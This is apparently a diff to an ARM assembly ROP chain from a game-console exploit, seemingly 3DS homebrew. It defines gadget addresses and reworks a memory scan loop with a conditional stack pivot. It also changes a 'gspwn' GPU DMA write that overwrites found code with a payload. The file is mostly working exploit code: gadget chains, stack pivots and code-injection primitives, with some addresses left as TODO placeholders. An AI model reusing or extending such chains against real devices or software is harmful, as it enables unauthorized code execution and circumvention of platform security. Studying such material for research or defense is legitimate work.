@@ -29,6 +29,17 @@ ROP_CN_POP_R3_ADD_SPR3_POP_PC equ (0x001001c8) ; stack pivot
 CN_MEMCPY equ (0x00224FB0)
 CN_SLEEP equ (0x00293D14)
 
+; TODO : fill in
+CN_GSPGPU_INTERRUPT_RECEIVER_STRUCT equ (0)
+CN_GSPGPU_GXTRYENQUEUE equ (0)
+CN_SAVE_BUFFER_PTR equ (0)
+CN_RANDCODEBIN_COPY_BASE equ (0)
+CN_RANDCODEBIN_BASE equ (0)
+CN_SCANLOOP_CURPTR equ (0)
+CN_SCANLOOP_STRIDE equ (0x10000)
+CN_SCANLOOP_MAGICVAL equ (0)
+CN_SCANLOOP_TARGETCODE equ (0)
+
 .macro set_lr,_lr
 	.word ROP_CN_POP_R3PC ; pop {r3, pc}
 		.word ROP_CN_POP_PC ; r3
@@ -145,41 +156,6 @@ CN_SLEEP equ (0x00293D14)
 	.word CN_MEMCPY
 .endmacro
 
-.macro memcpy_dstderefadd,dst_base_ptr,dst_offset_ptr,src,size,offset
-	str_val @@function_call + offset, CN_MEMCPY
-	.word ROP_CN_POP_R0PC
-		.word dst_offset_ptr
-	.word ROP_CN_LDR_R0R0_POP_R4PC
-		.word offset + @@addval_dst ; r4 (addval_dst)
-	.word ROP_CN_STR_R0R4_POP_R4PC
-		.word 0xDEADBABE ; r4 (garbage)
-	set_lr ROP_CN_NOP
-	.word ROP_CN_POP_R0PC
-		.word dst_base_ptr
-	.word ROP_CN_POP_R4PC
-		@@addval_dst:
-		.word 0xDEADBABE ; r4 (initially garbage, overwritten previously)
-	.word ROP_CN_ADD_R0R4_POP_R4PC
-		.word 0xDEADBABE ; r4 (garbage)
-	.word ROP_CN_POP_R1PC ; pop {r1, pc}
-		.word src ; r1
-	.word ROP_CN_POP_R2R3R4PC
-		.word size       ; r2 (addr)
-		.word 0xDEADBABE ; r3 (garbage)
-		.word 0xDEADBABE ; r4 (garbage)
-	.word ROP_CN_POP_R4R5R6R7R8R9R10R11PC
-		.word 0xDEADBABE ; r4 (garbage)
-		.word 0xDEADBABE ; r5 (garbage)
-		.word 0xDEADBABE ; r6 (garbage)
-		.word 0xDEADBABE ; r7 (garbage)
-		.word 0xDEADBABE ; r8 (garbage)
-		.word 0xDEADBABE ; r9 (garbage)
-		.word 0xDEADBABE ; r10 (garbage)
-		.word 0xDEADBABE ; r11 (garbage)
-	@@function_call:
-	.word CN_MEMCPY
-.endmacro
-
 .macro sleep,nanosec_low,nanosec_high
 	set_lr ROP_CN_POP_PC
 	.word ROP_CN_POP_R0PC ; pop {r0, pc}
@@ -230,22 +206,22 @@ secondaryROP:
 	scan_loop:
 		ldr_add_r0 CN_SCANLOOP_CURPTR, CN_SCANLOOP_STRIDE
 		str_r0 CN_SCANLOOP_CURPTR
-		cmp_derefptr_r0addr CN_SCANLOOP_MAGICVAL, (scan_loop_pivot - scan_loop_pivot_after)
-		str_r0 CN_SCANLOOP_CONDOFFSETPTR
+		cmp_derefptr_r0addr CN_SCANLOOP_MAGICVAL, (scan_loop_pivot_after - scan_loop_pivot)
 
-		; essentially if conditional call above returns true, we overwrite scan_loop_pivot with two nops
-		; that way we exit the loop
-		memcpy_dstderefadd scan_loop_pivot_after, CN_SCANLOOP_CONDOFFSETPTR, scan_loop_pivot_after, 0x8, offset
+		; essentially if conditional call above returns true, we overwrite scan_loop_pivot_offset with 8 (enough to skip real pivot), and 0 otherwise
+		; that way we exit the loop conditionally
+		str_r0 scan_loop_pivot_offset
 
-		; this pivot is non-conditional
-		; but once we find what we want, we'll just overwrite it
+		; this pivot is initially uncondintional but we overwrite the offset using conditional value to skip second pivot when we're done
+		.word ROP_CN_POP_R3_ADD_SPR3_POP_PC
+			scan_loop_pivot_offset:
+			.word 0x00000000
+		; this pivot is uncondintional always
 		scan_loop_pivot:
 		jump_sp scan_loop
 		scan_loop_pivot_after:
-		.word ROP_CN_POP_PC
-		.word ROP_CN_POP_PC
 
-	gspwn_dstderefadd CN_GSPHEAP + CN_RANDCODEBIN_BASE - (CN_GSPHEAP + CN_RANDCODEBIN_COPY_BASE), CN_SCANLOOP_CURPTR, code_payload, 0x400
+	gspwn_dstderefadd CN_GSPHEAP + CN_RANDCODEBIN_BASE - (CN_GSPHEAP + CN_RANDCODEBIN_COPY_BASE), CN_SCANLOOP_CURPTR, 0, 0x400, 0
 
 	sleep 200*1000*1000, 0x00000000
 
@@ -358,13 +334,13 @@ secondaryROP:
 	; 	.word 0x00100000+CN_INITIALCODE_OFFSET ;jump to code
 endROP:
 
-.align 4
-codePatch:
-	.incbin "cn_initial/cn_initial.bin"
-	.word 0xDEADDEAD
-	.word 0xDEADDEAD
-	.word 0xDEADDEAD
-	.word 0xDEADDEAD
-codePatchEnd:
+; .align 4
+; codePatch:
+; 	.incbin "cn_initial/cn_initial.bin"
+; 	.word 0xDEADDEAD
+; 	.word 0xDEADDEAD
+; 	.word 0xDEADDEAD
+; 	.word 0xDEADDEAD
+; codePatchEnd:
 
 .Close
